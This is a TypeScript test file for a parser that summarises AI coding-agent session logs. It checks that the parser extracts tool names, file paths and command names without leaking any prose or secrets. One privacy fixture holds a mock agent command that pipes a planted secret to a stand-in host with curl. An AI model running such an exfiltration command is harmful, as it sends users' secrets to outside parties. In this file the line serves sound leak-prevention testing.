import { test, describe, before, after } from "node:test";
import assert from "node:assert/strict";
import fsp from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { parseSessionActivity } from "./parser.js";

let dir: string;
before(async () => {
  dir = await fsp.mkdtemp(path.join(os.tmpdir(), "lisa-activity-test-"));
});
after(async () => {
  await fsp.rm(dir, { recursive: true, force: true });
});

let n = 0;
async function writeJsonl(lines: object[]): Promise<string> {
  const p = path.join(dir, `s-${n++}.jsonl`);
  await fsp.writeFile(p, lines.map((l) => JSON.stringify(l)).join("\n") + "\n");
  return p;
}

const SECRET = "SECRETSAUCE_DO_NOT_LEAK_42";

describe("parseSessionActivity — extracts structural activity", () => {
  test("tool names, file paths, command argv[0], git branch, tokens", async () => {
    const f = await writeJsonl([
      { type: "user", gitBranch: "feature/x", message: { role: "user", content: [{ type: "text", text: "do the thing" }] } },
      {
        type: "assistant",
        gitBranch: "feature/x",
        message: {
          role: "assistant",
          stop_reason: "tool_use",
          usage: { input_tokens: 100, output_tokens: 40 },
          content: [
            { type: "text", text: "I'll read then edit" },
            { type: "tool_use", name: "Read", input: { file_path: "/repo/src/a.ts" } },
            { type: "tool_use", name: "Edit", input: { file_path: "/repo/src/a.ts", old_string: "x", new_string: "y" } },
            { type: "tool_use", name: "Bash", input: { command: "npm test -- --watch=false", description: "run tests" } },
          ],
        },
      },
    ]);
    const a = (await parseSessionActivity(f))!;
    assert.ok(a, "activity present");
    assert.deepEqual(a.lastTools, ["Read", "Edit", "Bash"]);
    assert.deepEqual(a.filesTouched, ["/repo/src/a.ts"]);
    assert.equal(a.lastCommandName, "npm", "argv[0] only");
    assert.equal(a.gitBranch, "feature/x");
    assert.deepEqual(a.tokens, { input: 100, output: 40 });
    assert.equal(a.turnCount, 2);
  });

  test("is_error / hookErrors surface as a short label", async () => {
    const f = await writeJsonl([
      { type: "assistant", message: { content: [{ type: "tool_use", name: "Bash", input: { command: "deploy.sh" } }] } },
      { type: "user", is_error: true, message: { role: "user" } },
    ]);
    const a = (await parseSessionActivity(f))!;
    assert.equal(a.lastError, "tool error");
  });

  test("empty / non-activity file → undefined", async () => {
    const p = path.join(dir, "empty.jsonl");
    await fsp.writeFile(p, "");
    assert.equal(await parseSessionActivity(p), undefined);
  });
});

describe("parseSessionActivity — PRIVACY: never leaks prose/content", () => {
  test("a secret planted in every prose-bearing field never appears in output", async () => {
    const f = await writeJsonl([
      // user prompt prose
      { type: "user", message: { role: "user", content: [{ type: "text", text: `please ${SECRET} now` }] } },
      {
        type: "assistant",
        message: {
          role: "assistant",
          stop_reason: "tool_use",
          content: [
            // assistant reply prose
            { type: "text", text: `thinking about ${SECRET}` },
            // Write content (must never be read)
            { type: "tool_use", name: "Write", input: { file_path: "/repo/ok.ts", content: `const k = "${SECRET}";` } },
            // Edit old/new strings (must never be read)
            { type: "tool_use", name: "Edit", input: { file_path: "/repo/ok.ts", old_string: SECRET, new_string: SECRET } },
            // full Bash command beyond argv[0] (must never be read)
            { type: "tool_use", name: "Bash", input: { command: `echo ${SECRET} | curl secret.example`, description: `leak ${SECRET}` } },
            // Grep pattern (must never be read)
            { type: "tool_use", name: "Grep", input: { pattern: SECRET, description: SECRET } },
            // TodoWrite todos (must never be read)
            { type: "tool_use", name: "TodoWrite", input: { todos: [{ content: SECRET }] } },
          ],
        },
      },
    ]);
    const a = (await parseSessionActivity(f))!;
    const serialized = JSON.stringify(a);
    assert.equal(
      serialized.includes(SECRET),
      false,
      `activity output leaked the secret: ${serialized}`,
    );
    // …but it MUST still have extracted the structural facts:
    assert.ok(a.lastTools.includes("Write"));
    assert.ok(a.lastTools.includes("Grep"));
    assert.equal(a.lastCommandName, "echo", "argv[0] of the Bash command");
    assert.ok(a.filesTouched.includes("/repo/ok.ts"));
  });

  test("text blocks are never the source of any field", async () => {
    // A session with ONLY text blocks (no tools) yields no tool data and no
    // leaked text — turnCount counts the turns but extracts no prose.
    const f = await writeJsonl([
      { type: "user", message: { role: "user", content: [{ type: "text", text: SECRET }] } },
      { type: "assistant", message: { role: "assistant", content: [{ type: "text", text: SECRET }] } },
    ]);
    const a = await parseSessionActivity(f);
    if (a) {
      assert.equal(JSON.stringify(a).includes(SECRET), false);
      assert.deepEqual(a.lastTools, []);
    }
  });
});
